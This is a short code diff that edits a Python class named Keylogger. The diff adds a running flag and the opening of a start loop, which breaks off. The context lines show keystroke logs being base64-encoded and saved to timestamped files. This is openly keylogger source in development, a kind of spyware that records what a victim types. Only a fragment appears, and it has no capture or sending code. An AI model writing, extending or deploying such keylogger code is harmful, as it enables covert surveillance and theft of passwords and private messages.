@@ -8,6 +8,7 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
         self.filename = ""
+        self.running = True  
         
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
@@ -34,3 +35,6 @@ class Keylogger:
             encoded_log = base64.b64encode(self.log.encode())
             f.write(encoded_log)  # Utiliser write() pour écrire dans le fichier
         print(f"[+] Saved {self.filename}.txt")
+    
+    def start(self):
+        while self.running: 
